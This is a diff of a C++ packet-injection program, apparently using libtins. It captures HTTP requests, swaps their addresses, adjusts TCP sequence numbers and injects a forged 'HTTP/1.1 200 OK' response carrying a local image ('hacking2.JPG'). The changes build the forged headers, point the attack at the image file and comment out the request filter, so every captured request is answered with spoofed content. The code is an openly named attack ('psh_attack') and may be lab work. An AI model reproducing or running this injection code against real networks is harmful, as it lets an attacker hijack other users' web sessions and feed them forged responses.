@@ -35,7 +35,7 @@ struct pk_set
         string path;
         cout<<"HTML PATH : ";
         //FILE *fp = fopen(path.c_str(),"rb");
-        FILE *fp = fopen("/var/www/html/test.html","rb");
+        FILE *fp = fopen("/var/www/html/hacking2.JPG","rb");
         fseek(fp,0,SEEK_END);//moving list array
         len = ftell(fp);
         cout<<len<<endl;
@@ -103,9 +103,8 @@ struct pk_set
     void chg_send()
     {
         fprintf(stderr, "bef sending 111\n");
-        EthernetII psh_attack = new_ethernet / new_ip / new_tcp /RawPDU((const uint8_t *)image, len);
+        EthernetII psh_attack = new_ethernet / new_ip / new_tcp /RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1221\n\n") / RawPDU((const uint8_t *)image,len);
         sender.send(psh_attack, "eth0");
-        new_tcp.flags(0x11);
         fprintf(stderr, "Attack..");
         cout<<"send Debug\n";
         debug(new_ethernet,new_ip,new_tcp);
@@ -121,13 +120,14 @@ struct pk_set
         {
             const RawPDU::payload_type& payload = raw.payload();
             //if(web_image((char *)payload.data()))
+            //{
             pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
             chg_send();
             cout<<"request packet "<<"\n";
             cout<<payload.data()<<"\n";
             debug(ethernet,ip,tcp);
-            return true;
+            //}
         }
         return true;
     }
